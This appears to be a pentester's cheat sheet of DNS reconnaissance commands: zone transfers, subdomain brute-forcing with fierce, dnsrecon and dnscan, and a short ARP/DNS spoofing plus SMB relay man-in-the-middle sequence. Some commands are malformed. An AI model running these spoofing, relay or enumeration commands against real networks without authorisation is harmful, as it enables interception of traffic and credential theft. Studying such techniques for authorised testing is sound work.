
### Nslookup interactice shell:
nslookup

2) server (IP)

3) set q=NS

4) DOMAIN.com

---
nslookup

server IP

ns.DOMAIN.com

ns1.DOMAIN.com

### Zone transfer with VPN:

dig @(IP) DOMAIN.com -t AXFR +nocookie

dig @172.16.5.10 -x 172.16.5.10 +nocookie  ->example, point the traffic into the VPN tunnel

dig @172.16.5.10 -t DOMAIN.com +nocookie
 
### Manual way to find names 
 for name in $(cat hostnames.txt); do host $name.domain.com 172.16.5.10 -W 2; done | grep 'has address'
 
  for name in $(cat /usr/share/fierce/hosts.txt); do host $name.Domain.com 172.16.5.10 -W 2; done | grep 'has address'
  
  ### DNS spoof & relay attack
  
   exploit/smb_relay
   
   on our kali
    echo "172.16.5.150 *.DOMAIN.com" > dns
    dnsspoof -i tap0 -f dns
    
echo 1 > /proc/sys/net/ipv4/ip_forward

arpspoof -i tap0 -t IP1 IP2

arpspoof -i tap0 -t IP2 IP1

### DNSrecon
dnsrecon -r 127.0.0.0/24 -n ip

dig axfr @ip

dig axfr bank.htb @ip

nslookup -> set type=any -> ls -d blah.com

dig axfr blah.com @ns1.blah.com

dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml

dig version.bind CHAOS TXT @DNS

### Dig adn fierce

dig axfr @<DNS_IP> #Try zone transfer without domain

dig axfr @<DNS_IP> <DOMAIN> #Try zone transfer guessing the domain

fierce -dns <DOMAIN> #Will try toperform a zone transfer against every authoritative name server and if this doesn'twork, will launch a dictionary attack

dnsrecon -D subdomains-1000.txt -d <DOMAIN> -n IP_DNS

dnscan -d <domain> -r -w subdomains-1000.txt #Bruteforce subdomains in recursive way, https://github.com/rbsec/dnscan

### Config files:
host.conf

resolv.conf

named.conf
